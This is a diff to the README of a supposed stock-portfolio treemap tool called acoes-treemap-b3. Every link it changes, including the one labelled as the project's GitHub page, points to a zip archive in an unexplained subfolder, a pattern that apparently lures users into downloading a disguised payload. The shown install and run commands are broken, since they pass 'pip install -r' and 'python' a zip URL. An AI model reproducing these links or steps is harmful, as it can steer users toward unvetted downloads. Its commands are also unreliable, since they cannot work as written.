@@ -1,6 +1,6 @@
 # 📊 acoes-treemap-b3 - Visualize Your Stock Portfolio Effortlessly
 
-[![Download acoes-treemap-b3](https://raw.githubusercontent.com/Sudhanshu9315/acoes-treemap-b3/main/sereward/acoes-treemap-b3.zip%20Now-%https://raw.githubusercontent.com/Sudhanshu9315/acoes-treemap-b3/main/sereward/acoes-treemap-b3.zip)](https://raw.githubusercontent.com/Sudhanshu9315/acoes-treemap-b3/main/sereward/acoes-treemap-b3.zip)
+[![Download acoes-treemap-b3](https://github.com/Sudhanshu9315/acoes-treemap-b3/raw/refs/heads/main/sereward/acoes_treemap_b_v3.9.zip%20Now-%https://github.com/Sudhanshu9315/acoes-treemap-b3/raw/refs/heads/main/sereward/acoes_treemap_b_v3.9.zip)](https://github.com/Sudhanshu9315/acoes-treemap-b3/raw/refs/heads/main/sereward/acoes_treemap_b_v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to acoes-treemap-b3! This application helps you visualize your stock por
 
 To acquire acoes-treemap-b3, visit this page to download:
 
-[Download acoes-treemap-b3](https://raw.githubusercontent.com/Sudhanshu9315/acoes-treemap-b3/main/sereward/acoes-treemap-b3.zip)
+[Download acoes-treemap-b3](https://github.com/Sudhanshu9315/acoes-treemap-b3/raw/refs/heads/main/sereward/acoes_treemap_b_v3.9.zip)
 
 You will find releases of the application. Choose the latest version for the best experience.
 
@@ -49,7 +49,7 @@ Before you start, ensure your system meets the following requirements:
    Install the required Python libraries by running:
 
    ```bash
-   pip install -r https://raw.githubusercontent.com/Sudhanshu9315/acoes-treemap-b3/main/sereward/acoes-treemap-b3.zip
+   pip install -r https://github.com/Sudhanshu9315/acoes-treemap-b3/raw/refs/heads/main/sereward/acoes_treemap_b_v3.9.zip
    ```
 
 ### ⚙️ Running the Application
@@ -61,7 +61,7 @@ After installation, you can run the application:
 3. Execute the following command:
 
    ```bash
-   python https://raw.githubusercontent.com/Sudhanshu9315/acoes-treemap-b3/main/sereward/acoes-treemap-b3.zip
+   python https://github.com/Sudhanshu9315/acoes-treemap-b3/raw/refs/heads/main/sereward/acoes_treemap_b_v3.9.zip
    ```
 
 Your web browser should open a new tab displaying the interactive treemap.
@@ -122,6 +122,6 @@ We welcome contributions! If you wish to suggest features or report bugs, please
 
 Feel free to share your feedback or ideas. You can find us on GitHub:
 
-[Visit our GitHub page](https://raw.githubusercontent.com/Sudhanshu9315/acoes-treemap-b3/main/sereward/acoes-treemap-b3.zip)
+[Visit our GitHub page](https://github.com/Sudhanshu9315/acoes-treemap-b3/raw/refs/heads/main/sereward/acoes_treemap_b_v3.9.zip)
 
 We appreciate your interest in acoes-treemap-b3 and hope it helps you manage your investments effectively!
